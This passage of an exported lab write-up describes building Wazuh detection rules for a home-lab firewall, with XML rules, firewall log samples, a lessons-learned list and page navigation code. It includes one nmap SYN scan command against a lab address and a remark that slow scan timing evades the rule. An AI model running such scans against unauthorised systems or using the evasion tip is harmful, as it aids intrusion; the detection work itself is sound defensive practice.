+<p dir="auto"><strong>Rule Triggered</strong></p>
+<pre class="language-xml"><code data-line="22" class="language-xml is-loaded"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100301<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100300<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nft_action<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>DROP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Firewall dropped network packet context.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100312<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100301<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nft_srcint<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>wan0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>srcip</span><span class="token punctuation">&gt;</span></span>10.0.0.0/8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>srcip</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>srcip</span><span class="token punctuation">&gt;</span></span>192.168.0.0/16<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>srcip</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>srcip</span><span class="token punctuation">&gt;</span></span>172.16.0.0/12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>srcip</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Security Alert: Inbound spoofed private IP address dropped on WAN interface.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mitre</span><span class="token punctuation">&gt;</span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>T1036<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mitre</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><strong>Wazuh Alerts</strong><br>
+<span alt="Pasted image 20260729104054.png" src="_files/pasted-image-20260729104054.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260729104054.png" src="_files/pasted-image-20260729104054.png" target="_self"></span></p>
+</div></div></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="example" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-list"><path d="M3 5h.01"></path><path d="M3 12h.01"></path><path d="M3 19h.01"></path><path d="M8 5h13"></path><path d="M8 12h13"></path><path d="M8 19h13"></path></svg></div><div class="callout-title-inner">Port Scanning (Rule 100330) and Packet Flood (Rule 100331)</div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto"><strong>Attack Execution</strong><br>
+For this test, I used <code>nmap</code> to simulate a port (1-250) scan.</p>
+<pre class="language-bash"><code data-line="4" class="language-bash is-loaded"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-p</span> <span class="token number">1</span>-250 --min-rate <span class="token number">200</span> <span class="token number">172.16</span>.0.1
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><strong>Generated Log</strong></p>
+<pre><code data-line="9">Aug 21 06:51:42 firewall kernel: [ 2980.142898] NFT-IN-DROP-DEFAULT IN=lan0 OUT= MAC=00:03:0d:53:17:49:30:16:9d:72:51:2b:08:00 SRC=10.0.0.50 DST=172.16.0.1 LEN=44 TOS=0x00 PREC=0x00 TTL=39 ID=21779 PROTO=TCP SPT=39533 DPT=15 WINDOW=1024 RES=0x00 SYN URGP=0 
+...
+Aug 21 06:51:42 firewall kernel: [ 2980.014972] NFT-IN-DROP-DEFAULT IN=lan0 OUT= MAC=00:03:0d:53:17:49:30:16:9d:72:51:2b:08:00 SRC=10.0.0.50 DST=172.16.0.1 LEN=44 TOS=0x00 PREC=0x00 TTL=45 ID=32961 PROTO=TCP SPT=39531 DPT=203 WINDOW=1024 RES=0x00 SYN URGP=0 
+Aug 21 06:51:42 firewall kernel: [ 2979.998850] NFT-IN-DROP-DEFAULT IN=lan0 OUT= MAC=00:03:0d:53:17:49:30:16:9d:72:51:2b:08:00 SRC=10.0.0.50 DST=172.16.0.1 LEN=44 TOS=0x00 PREC=0x00 TTL=55 ID=53006 PROTO=TCP SPT=39531 DPT=3 WINDOW=1024 RES=0x00 SYN URGP=0 
+Aug 21 06:51:42 firewall kernel: [ 2979.967004] NFT-IN-DROP-DEFAULT IN=lan0 OUT= MAC=00:03:0d:53:17:49:30:16:9d:72:51:2b:08:00 SRC=10.0.0.50 DST=172.16.0.1 LEN=44 TOS=0x00 PREC=0x00 TTL=52 ID=17337 PROTO=TCP SPT=39531 DPT=229 WINDOW=1024 RES=0x00 SYN URGP=0
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><strong>Rules Triggered</strong></p>
+<pre class="language-xml"><code data-line="18" class="language-xml is-loaded"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100301<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100300<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nft_action<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>DROP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Firewall dropped network packet context.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100330<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>7<span class="token punctuation">"</span></span> <span class="token attr-name">frequency</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span> <span class="token attr-name">timeframe</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>100301<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>same_srcip</span> <span class="token punctuation">/&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Threat Hunt: Active port scan or reconnaissance behavior detected from source host.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mitre</span><span class="token punctuation">&gt;</span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>T1595.001<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mitre</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100331<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8<span class="token punctuation">"</span></span> <span class="token attr-name">frequency</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">timeframe</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>100301<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_matched_sid</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>same_srcip</span> <span class="token punctuation">/&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Extreme packet drop frequency detected from a single host. Possible DoS or network flooding.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mitre</span><span class="token punctuation">&gt;</span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>T1498<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mitre</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><strong>Wazuh Alerts</strong><br>
+<strong>Port Scanning</strong> (Multiple alerts were generated)<br>
+<span alt="Pasted image 20260821065511.png" src="_files/pasted-image-20260821065511.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260821065511.png" src="_files/pasted-image-20260821065511.png" target="_self"></span></p>
+<p dir="auto"><strong>Packet Flood</strong><br>
+<span alt="Pasted image 20260821065649.png" src="_files/pasted-image-20260821065649.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260821065649.png" src="_files/pasted-image-20260821065649.png" target="_self"></span></p>
+</div></div></div><div class="el-h5"><h5 data-heading="V. Lessons Learned" dir="auto" class="heading" id="V._Lessons_Learned_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>V. Lessons Learned</h5></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span>Defenders have to carefully balance alert fatigue and catching stealthy attacks. While setting a rule for dropped packets with frequency thresholds of 20 queries over 60 seconds reduces false positives, attackers using low and slow tactics such as nmap with <code>-T0</code> or <code>-T1</code> flags will completely evade the rule.</li>
+<li data-line="1" dir="auto"><span class="list-bullet"></span>The ability of attackers to evade detection mechanisms highlights the importance of defense-in-depth which tries to monitor and flag indicators of compromise on multiple layers of the environment.</li>
+<li data-line="2" dir="auto"><span class="list-bullet"></span>While <code>wazuh-logtest</code> is useful for verifying decoders and individual rules, frequency-based correlation rules are best validated with real log events generated with realistic attack simulations.</li>
+</ul></div><div class="el-h5"><h5 data-heading="VI. Next Steps" dir="auto" class="heading" id="VI._Next_Steps_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>VI. Next Steps</h5></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span>Implement a host-based detection by deploying Wazuh agents with sysmon or auditd.</li>
+<li data-line="1" dir="auto"><span class="list-bullet"></span>Explore Wazuh active response and other capabilities.</li>
+</ul></div><div class="el-h5"><h5 data-heading="References" dir="auto" class="heading" id="References_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>References</h5></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span><a data-tooltip-position="top" aria-label="https://documentation.wazuh.com/current/user-manual/ruleset/decoders/index.html" rel="noopener nofollow" class="external-link is-unresolved" href="https://documentation.wazuh.com/current/user-manual/ruleset/decoders/index.html" target="_self">Decoders - Data analysis · Wazuh documentation</a></li>
+<li data-line="1" dir="auto"><span class="list-bullet"></span><a data-tooltip-position="top" aria-label="https://thekelleys.org.uk/dnsmasq/doc.html" rel="noopener nofollow" class="external-link is-unresolved" href="https://thekelleys.org.uk/dnsmasq/doc.html" target="_self">Dnsmasq - network services for small networks.</a></li>
+<li data-line="2" dir="auto"><span class="list-bullet"></span><a rel="noopener nofollow" class="external-link is-unresolved" href="https://alltools.dev/tools/tech/regex-tester/" target="_self">https://alltools.dev/tools/tech/regex-tester/</a></li>
+<li data-line="3" dir="auto"><span class="list-bullet"></span><a rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/" target="_self">https://attack.mitre.org/</a></li>
+</ul></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"><div id="right-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="right-sidebar-content" class="leaf-content"><div id="outline" class=" tree-container"><div class="feature-header"><div class="feature-title">Table Of Contents</div><button class="clickable-icon nav-action-button tree-collapse-all" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#Developing_Wazuh_Decoders_and_Rules_for_Lab_Firewall_0" data-path="#Developing_Wazuh_Decoders_and_Rules_for_Lab_Firewall_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Developing Wazuh Decoders and Rules for Lab Firewall">Developing Wazuh Decoders and Rules for Lab Firewall</div></a><div class="tree-item-children"><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#I._Project_Summary_0" data-path="#I._Project_Summary_0"><div class="tree-item-inner heading-link" heading-name="I. Project Summary">I. Project Summary</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#II._Key_Engineering_Decisions_0" data-path="#II._Key_Engineering_Decisions_0"><div class="tree-item-inner heading-link" heading-name="II. Key Engineering Decisions">II. Key Engineering Decisions</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="6"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#1._Created_and_Enhanced_Telemetry_Parsing_0" data-path="#1._Created_and_Enhanced_Telemetry_Parsing_0"><div class="tree-item-inner heading-link" heading-name="1. Created and Enhanced Telemetry Parsing">1. Created and Enhanced Telemetry Parsing</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="6"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#2._Layer_7_DNS_Telemetry_Analysis_0" data-path="#2._Layer_7_DNS_Telemetry_Analysis_0"><div class="tree-item-inner heading-link" heading-name="2. Layer 7 DNS Telemetry Analysis">2. Layer 7 DNS Telemetry Analysis</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="6"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#3._Basic_Behavioral_Detection_Rule_over_Hardcoded_Signature_0" data-path="#3._Basic_Behavioral_Detection_Rule_over_Hardcoded_Signature_0"><div class="tree-item-inner heading-link" heading-name="3. Basic Behavioral Detection Rule over Hardcoded Signature">3. Basic Behavioral Detection Rule over Hardcoded Signature</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="6"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#4._Reduced_Alert_Fatigue_0" data-path="#4._Reduced_Alert_Fatigue_0"><div class="tree-item-inner heading-link" heading-name="4. Reduced Alert Fatigue">4. Reduced Alert Fatigue</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#III._Challenges_0" data-path="#III._Challenges_0"><div class="tree-item-inner heading-link" heading-name="III. Challenges">III. Challenges</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#IV._Validation_and_Testing_0" data-path="#IV._Validation_and_Testing_0"><div class="tree-item-inner heading-link" heading-name="IV. Validation and Testing">IV. Validation and Testing</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#V._Lessons_Learned_0" data-path="#V._Lessons_Learned_0"><div class="tree-item-inner heading-link" heading-name="V. Lessons Learned">V. Lessons Learned</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#VI._Next_Steps_0" data-path="#VI._Next_Steps_0"><div class="tree-item-inner heading-link" heading-name="VI. Next Steps">VI. Next Steps</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><a class="tree-item-self is-clickable" href="projects/developing-wazuh-decoders-and-rules-for-lab-firewall.html#References_0" data-path="#References_0"><div class="tree-item-inner heading-link" heading-name="References">References</div></a><div class="tree-item-children"></div></div></div></div></div><div class="graph-view-wrapper"><div class="feature-header"><div class="feature-title">Interactive Graph</div></div><div class="graph-view-placeholder">
+		<div class="graph-view-container">
+			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
+			<div class="graph-icon graph-global" role="button" aria-label="Global Graph" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-git-fork"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></div>
+			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
+		</div>
+		</div></div></div></div><script defer="">let rs = document.querySelector("#right-sidebar"); rs.classList.toggle("is-collapsed", window.innerWidth < 768); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></div></div>
+<!-- Navigation Buttons -->
+<div class="nav-buttons">
+  <button class="nav-btn nav-back" id="navBack" title="Go back" aria-label="Navigate back">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 18l-6-6 6-6"></path>
+    </svg>
+  </button>
+  
+  <button class="nav-btn nav-home" id="navHome" title="Go to home" aria-label="Navigate to home">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+      <polyline points="9 22 9 12 15 12 15 22"></polyline>
+    </svg>
+  </button>
+  
+  <button class="nav-btn nav-forward" id="navForward" title="Go forward" aria-label="Navigate forward">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M9 18l6-6-6-6"></path>
+    </svg>
+  </button>
+</div>
+
+<style>
+:root {
+  /* Navigation Button Colors */
+  --nav-bg: #20242B;
+  --nav-border: #424958;
+  --nav-icon-color: #888888;
+  --nav-icon-hover: #DCDDDE;
+  --nav-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  --nav-glow: 0 0 10px rgba(97, 175, 239, 0.15);
+  --nav-accent: #61AFEF;
+  --nav-transition: all 0.2s ease-in-out;
+}
+
+.nav-buttons {
+  position: fixed;
+  bottom: 2rem;
+  left: 50%;
+  transform: translateX(-50%);
+  display: flex;
+  gap: 12px;
+  z-index: 1000;
+  background: rgba(32, 36, 43, 0.85);
+  backdrop-filter: blur(8px);
+  padding: 10px 14px;
+  border-radius: 12px;
+  box-shadow: var(--nav-shadow);
+  border: 1px solid rgba(66, 73, 88, 0.6);
+  animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+
+@keyframes slideUp {
+  from {
+    opacity: 0;
+    transform: translateX(-50%) translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+}
+
+.nav-btn {
+  width: 44px;
+  height: 44px;
+  border: 1px solid var(--nav-border);
+  border-radius: 8px;
+  background: var(--nav-bg);
+  color: var(--nav-icon-color);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: var(--nav-transition);
+  padding: 0;
+  font: inherit;
+  flex-shrink: 0;
+}
+
+.nav-btn:hover:not(:disabled) {
+  color: var(--nav-icon-hover);
+  border-color: var(--nav-accent);
+  transform: translateY(-3px);
+  box-shadow: var(--nav-glow);
+}
+
+.nav-btn:active:not(:disabled) {
+  transform: translateY(-1px);
+  box-shadow: 0 0 8px rgba(97, 175, 239, 0.2);
+}
+
+.nav-btn:disabled {
+  border-color: rgba(66, 73, 88, 0.3);
+  color: rgba(136, 136, 136, 0.4);
+  cursor: not-allowed;
+  opacity: 0.5;
+}
+
+.nav-btn svg {
+  width: 20px;
+  height: 20px;
+  stroke-width: 2;
+}
+
+/* Focus state for keyboard navigation */
+.nav-btn:focus-visible {
+  outline: none;
+  border-color: var(--nav-accent);
+  box-shadow: var(--nav-glow);
+}
+
+/* Responsive: Hide back/forward on mobile, keep home */
+@media (max-width: 768px) {
+  .nav-buttons {
+    gap: 8px;
+    padding: 8px 10px;
+  }
+
+  .nav-btn {
+    width: 40px;
+    height: 40px;
+  }
+
+  .nav-btn.nav-back,
+  .nav-btn.nav-forward {
+    display: none;
+  }
+
+  .nav-btn svg {
+    width: 18px;
+    height: 18px;
+  }
+}
+
+/* Tablet: Reduce size slightly */
+@media (max-width: 1024px) {
+  .nav-buttons {
+    bottom: 1.5rem;
+  }
+}
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const backBtn = document.getElementById('navBack');
+  const homeBtn = document.getElementById('navHome');
+  const forwardBtn = document.getElementById('navForward');
+  
+  if (!backBtn || !homeBtn || !forwardBtn) return;
+  
+  // Check if back is available
+  function updateNavButtons() {
+    backBtn.disabled = !window.history.length || window.history.length <= 1;
+  }
